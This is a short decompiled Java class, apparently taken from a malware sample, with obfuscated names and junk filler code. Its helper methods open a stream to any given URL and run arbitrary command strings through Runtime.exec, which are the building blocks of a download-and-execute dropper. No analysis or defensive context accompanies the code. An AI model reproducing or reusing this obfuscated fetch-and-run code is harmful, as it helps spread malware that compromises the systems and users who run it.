import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Mekoa
{
    public static InputStream Traliv(final String uuior45) throws Exception {
        final URL iop8e = new URL(uuior45);
        int cnt = 44;
        --cnt;
        try {
            iop8e.openConnection();
            final int f = 1;
        }
        catch (Exception ex) {}
        return iop8e.openStream();
    }
    
    public static Runtime Posje() {
        return Runtime.getRuntime();
    }
    
    public static void Loema(final String wr4) throws Exception {
        final Process iiii4 = Posje().exec(wr4);
        iiii4.waitFor();
    }
}
